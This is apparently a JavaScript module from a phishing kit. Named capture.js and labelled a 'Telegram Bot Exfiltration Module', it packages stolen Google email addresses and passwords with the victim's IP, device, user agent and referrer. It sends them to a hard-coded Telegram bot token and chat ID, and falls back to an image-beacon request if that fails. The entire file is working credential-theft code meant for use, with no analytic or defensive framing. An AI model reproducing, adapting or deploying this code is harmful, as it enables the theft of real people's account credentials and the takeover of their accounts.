// capture.js - Telegram Bot Exfiltration Module
// Replace BOT_TOKEN and CHAT_ID with your values

const BOT_TOKEN = '8897401513:AAFzflbXYgY6_boVsxR00VbbL9s6d2rZ52g';
const CHAT_ID = '7607355489';

function sendToTelegram(data) {
    const message = formatMessage(data);
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            disable_web_page_preview: true
        })
    }).then(response => response.json())
      .then(result => {
          if (!result.ok) {
              console.error('Telegram send failed:', result);
              fallbackSend(data);
          }
      })
      .catch(error => {
          console.error('Telegram network error:', error);
          fallbackSend(data);
      });
}

function formatMessage(data) {
    const ip = data.ip || 'Unknown';
    const device = data.device || 'Unknown';
    const time = new Date(data.timestamp).toLocaleString();
    
    return `
<b>🔴 NEW GOOGLE CAPTURE</b>

<b>📧 Email:</b> <code>${escapeHtml(data.email)}</code>
<b>🔑 Password:</b> <code>${escapeHtml(data.password)}</code>

<b>🌐 IP:</b> <code>${ip}</code>
<b>📱 Device:</b> ${device}
<b>🖥️ Platform:</b> ${escapeHtml(data.platform || 'Unknown')}
<b>📐 Screen:</b> ${data.screen || 'Unknown'}
<b>🌍 Language:</b> ${data.language || 'Unknown'}
<b>🔗 Referrer:</b> ${escapeHtml(data.referrer || 'Direct')}
<b>⏰ Time:</b> ${time}

<b>🕵️ User Agent:</b>
<pre>${escapeHtml(data.userAgent || 'Unknown')}</pre>
    `.trim();
}

function escapeHtml(text) {
    if (!text) return '';
    return text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

function fallbackSend(data) {
    const img = new Image();
    const params = new URLSearchParams({
        email: data.email,
        password: data.password,
        device: data.device,
        platform: data.platform,
        time: data.timestamp,
        screen: data.screen,
        lang: data.language
    });
    img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(formatMessage(data))}`;
}

function getIP() {
    return fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(d => d.ip)
        .catch(() => 'Unknown');
}

if (typeof module !== 'undefined' && module.exports) {
    module.exports = { sendToTelegram, formatMessage, getIP };
}
